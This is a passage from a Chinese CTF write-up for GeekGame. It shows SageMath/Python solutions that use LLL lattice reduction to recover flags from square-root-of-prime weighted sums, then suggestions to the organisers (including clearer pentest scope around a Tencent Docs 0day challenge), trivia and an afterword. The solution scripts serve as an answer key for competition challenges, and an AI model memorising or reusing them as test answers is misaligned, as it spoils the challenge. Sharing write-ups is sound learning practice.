getcontext().prec=200

keys = []
for i in range(58):
    keys.append(Decimal(primes[i]).sqrt())

import math
print([math.floor(k * 2 ** 512) for k in keys])

s = Decimal('25800.359843622375482317741765092423108740749704076506674391637220601256480076793833725266596491145653469234638681214279142266384627498702292519864562549230222347690184575651985867669548991937988156542')
print(math.floor(s * 2 ** 512))
```

然后构造矩阵并且 LLL 就行了，下面是 SageMath 代码：

```python
N = 1

for flaglen in range(len(keys), 10, -1):
    print(flaglen)
    A = Matrix(ZZ, flaglen + 1, flaglen + 1)
    for i in range(flaglen):
        A[i, -1] = keys[i] * N
        A[i, i] = 1
    A[-1, -1] = s * N

    A2 = A.LLL()

    for line in A2:
        if all(x <= 0 for x in line[:-1]):
            line = [-x for x in line]
        cand = list(range(256))
        if all(x in cand for x in line[:-1]):
            print(''.join(chr(x) for x in line[:-1]))
```

第一问是直接解线性方程组就行。

```python
primes=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271]
C = ['16404', '16416', '16512', '16515', '16557', '16791', '16844', '16394', '15927', '15942', '15896', '15433', '15469', '15553', '15547', '15507', '15615', '15548', '15557', '15677', '15802', '15770', '15914', '15957', '16049', '16163']
C = [int(x) for x in C]

flaglen = len(C)
B = Matrix(RR, flaglen, flaglen)
for i in range(flaglen):
    for j in range(flaglen):
        B[i, j] = primes[(j - i) % flaglen].sqrt()
A = B.solve_right(vector(C[:flaglen]))
print(repr(''.join(chr(round(x)) for x in A)))
```

第二问我也用的 LLL，跟第三问是类似的思路，把矩阵改一下就行。

```python
C = ['19106.6119577929', '19098.1846041713', '19124.6925013201', '19072.8591005901', '19063.3797914261', '19254.8741381550', '19410.9493230296', '18896.7331405884', '19021.3167024024', '18924.6509997019', '18853.3351082021', '18957.2296714145', '18926.7035797566', '18831.7182995672', '18768.8192204100', '18668.7452791590', '18645.9207293335', '18711.1447224940']
C = [RR(x) for x in C]
primes=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271]
keys = []
for i in range(len(primes)):
    keys.append(floor(sqrt(primes[i]) * 2 ^ 64))
sums = [floor(c * 2 ^ 64) for c in C]
print(keys)
print(sums)

N = 10

flaglen = 28

A = Matrix(ZZ, flaglen + 1, flaglen + 18)
for i in range(flaglen):
    for j in range(18):
        A[i, flaglen + j] = keys[(i - j) % flaglen] * N
    A[i, i] = 1
for j in range(18):
    A[-1, flaglen + j] = sums[j] * N

A2 = A.LLL()

for line in A2:
    if all(x <= 0 for x in line[:-18]):
        line = [-x for x in line]
    cand = list(range(256))
    if all(x in cand for x in line[:-18]):
        print(''.join(chr(x) for x in line[:-18]))
```

## 比赛的改进建议

GeekGame 是相当高质量的面向新手的 CTF 比赛之一，可以看出主办方很专业。但是仍然会有一些不足之处值得改进。下面我列出来一些我个人认为不足的点，仅代表个人看法，实际情况当然还涉及很多其他因素要考虑。

- 对于动态分值的比赛，这种直线的排行榜曲线图不能反映真实的历史情况，比如某个时间谁是第一名。曲线图的历史部分会随着题目分数的变化而变化。可能有人在某个时间点曾经是第一名，但是从曲线图上再也看不出来了，或者第二名超越第一名的时间节点不正确之类的。更好的方式就是做成曲线，真实反映历史某个时刻的比分状况。xmcp 对此的回复是没必要，但是我的观点是这样拿当前的分数来计算历史时刻的比分状况，并不是只好不好的问题，它在数学上就是错误的，没有什么意义可言，只不过碰巧跟真实情况比较接近罢了。

- 关于企鹅文档这道题，抛开有没有经过腾讯同意、考察未修复的 0day 合不合适、网站在比赛过程中会不会变化这些事情不谈（因为这都只是主办方的问题），从比赛规则方面我认为很有必要明确一下可以进行渗透测试的范围，不止是针对这道题。正常来说，根据比赛规则「选手只能对题目指定的主机（域名为 prob*.geekgame.pku.edu.cn）和程序进行攻击。」如果我看见一个其他的域名，我就能够确认它并不是题目的一部分，并且不会进行任何正常浏览以外的信息收集和渗透测试，更不会假定里面包含题目的一部分。这不只是公平性问题，还会涉及法律问题。但在去年的 GeekGame 1st 中，那道套娃 misc 题其中一步就是从一个看起来跟比赛完全无关的网站中下载题目需要的文件。我第一次看到时直接把它当做无关信息了。卡了很久之后我才发现这个网站其实是题目的一部分。如果比赛规则和题目描述对此不加以明确的话，那我在图片的文件头里面看到 adobe.com，我是否应该访问这个网站去收集题目相关信息？如果我看到题目网页的部分 js 是从一个叫 jsdelivr 的网站提供的，那我是不是应该去尝试攻击一下这个网站看看有没有更多线索？对于企鹅文档这题也是，经验丰富的选手可能抓一下请求就做出来了。但是对于其他人来说，进行渗透测试、提权完全是一种会去尝试的方法，并且哪些域名应该去测试也不清楚，有些 API 完全是其他域名提供的。此时即使攻击 docs.qq.com 没问题，选手也无从得知边界在哪里，比如它的上级域名 qq.com 可以吗？所以我的建议是，如果有题目域名外的其他域名包含了题目信息，需要明确清楚边界在哪里。

- 对于录音题这样有提交次数限制的题目，建议改成按照时间来释放次数，比如每 30 分钟可以提交一次。考虑到选手有突发提交多次的需求，可以使用令牌桶算法，初始提供一些次数。这样可以让选手做题的时候更放心地尝试，而不用因为担心次数用完而小心翼翼地节约提交次数。同时，也可以避免因为不小心写错代码而快速把次数用尽。这个建议并非针对这一道题，而是一种通用的思路。虽然不是个大问题，但正是各种细节决定了比赛的体验。

- 有几道题目都是所谓的「1 day 题」，基本上只考察选手的搜索能力，并不需要理解攻击的原理。有的题目甚至复制粘贴网上的代码就能过，过了之后选手可能仍然不理解为什么。并且，这样的题目靠选手自己的能力是几乎不可能做出来的。这类题目不建议太多。如果一定要出，可以做一些修改来保证选手需要学习和理解才能解出。

- 难度梯度问题。对于新手来说难度会有一个断崖式的变化。在不增加题目总数量的前提下，可以考虑给现有题目增加一些特别简单的小问，就是对题目有一些理解就可以做出的那种，对于经验丰富的选手并不会增加多少工作量。这样也可以吸引选手做后面的小问，防止新手看到题目分值高、解出人数太少就直接不看了，连题目都没有打开过。如果轻松做出了第一小问，选手就会很自然地想一下后面的小问可以怎么解。

- 尽量避免参加过往年 GeekGame 或者其他特定比赛的选手有额外的优势

## 花絮

- 写了 g++ 那题的解题代码之后，VSCode 直接给我占 20 多 GB 内存，还有概率卡死。气得我把 .cpp 重命名成 .txt 就好了。

- 我跟 xmcp 说可以把分值的 `-58%` 这种数字搞成 steam 风格，这其实是我女票的想法。xmcp 试了试觉得不太美观，就只在第二阶段公告里面搞了一下。

- 申请那么多公网 IP 地址，按时间计费，申请到发现不符合要求就释放，一共花了我 36 块钱。

- 录音题有的句子我反复录制很多次，最后识别起来还没有 TTS 生成的准确率高。看来做这题对选手说普通话的标准程度还有要求。

- 「企业级理解」随便输入一个不存在的 URL 会显示「404 Not Fount」

- 这届比赛对编程语言的覆盖真是太全了！Python、Go、Rust、Scala、Java、C/C++、JavaScript、汇编语言，甚至还有 LLVM IR！

- 「智慧检测器」题面那张图是用什么工具生成的啊？

- 虽然这届比赛我完全没主动去抢一血（可以从我开始做题的时间和做题顺序看出），但是我扫雷最后一问仅仅比一血晚了两分钟，如果我手工扫雷的时候没有手残点错好几次，就会拿到一血了。

## 后记

虽然这次的 writeup 一张图都没有，并且部分题写得很简略，但是花的时间比上次都多，一共写了十几个小时……

我总是喜欢记录一些失败的尝试，并且认为失败的尝试的意义比成功的尝试还大。我也鼓励其他人在 CTF Writeup 以及其他文章中讲讲各种有趣的尝试，每个人都有独特的智慧，大家可以互相学习。

如果你对这篇 Writeup 有任何疑问，或者发现任何错误之处，以及发现我没能成功的某些尝试其实是可以成功的，非常欢迎一起交流讨论（发 issue @ 我，或者在比赛群里找我，或者其他联系方式都可以）。

最后，希望 GeekGame 明年可以办得更好。别忘了参加明年十月份中科大第十届信安大赛（Hackergame 2023），这个比赛跟 GeekGame 的风格很相似，参加人数更多，过去几年中每届比赛我都会在赛前检查一遍题目，以确保题目质量。
